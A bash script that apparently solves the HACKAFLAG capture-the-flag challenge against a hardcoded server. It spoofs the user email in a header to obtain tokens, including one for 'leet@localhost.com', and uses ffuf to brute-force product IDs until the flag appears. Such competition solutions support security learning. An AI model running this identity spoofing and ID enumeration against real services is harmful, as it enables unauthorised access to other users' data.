#!/bin/bash

HTTP_EMAIL="test@test.com"
WORDLIST="ids_hackaflag.txt"
WORDLIST_LIMIT=4000
HTTP_TOKEN=""

get_token() {
  curl -s http://157.245.74.188/logar/ -H "Email: $HTTP_EMAIL" | cut -d '>' -f3
}

list() {
  curl -s http://157.245.74.188/list/ -H "Token: $HTTP_TOKEN"
}

status() {
  curl -s http://157.245.74.188/status/ -H "Token: $HTTP_TOKEN" | grep "desafio" | cut -d '>' -f5 | cut -d '<' -f1
}

create_wordlist() {
  > $WORDLIST
  for i in $(seq 1 $WORDLIST_LIMIT); do echo $i >> $WORDLIST; done
}

bruteforce_id() {
  create_wordlist

  ffuf -s -w ./$WORDLIST -u http://157.245.74.188/products/?id=FUZZ -H "Token: $HTTP_TOKEN" -fs "50"

  rm $WORDLIST
}

users() {
  curl -s http://157.245.74.188/users/ -H "Token: $HTTP_TOKEN"
}

flag() {
  curl -s http://157.245.74.188/products/?id=$1 -H "Token: $HTTP_TOKEN" | cut -d ' ' -f2
}

HTTP_TOKEN=$(get_token)
echo "Token ($HTTP_EMAIL):"
echo $HTTP_TOKEN

echo

echo "List:"
echo $(list)

echo

echo "Status:"
echo $(status)

echo

echo "Users:"
echo $(users) 

echo

HTTP_EMAIL="leet@localhost.com"
HTTP_TOKEN=$(get_token)

echo "Token ($HTTP_EMAIL):"
echo $HTTP_TOKEN

echo

echo -n "Brute-force ID (1 .. $WORDLIST_LIMIT):"
ID=$(bruteforce_id)
echo $ID

echo

FLAG=$(flag $ID)
  
if [[ $(echo $FLAG | grep 'HACKAFLAG{') != '' ]]; then
  echo "Flag:"
  echo $FLAG
else
  echo "Flag not found"
fi
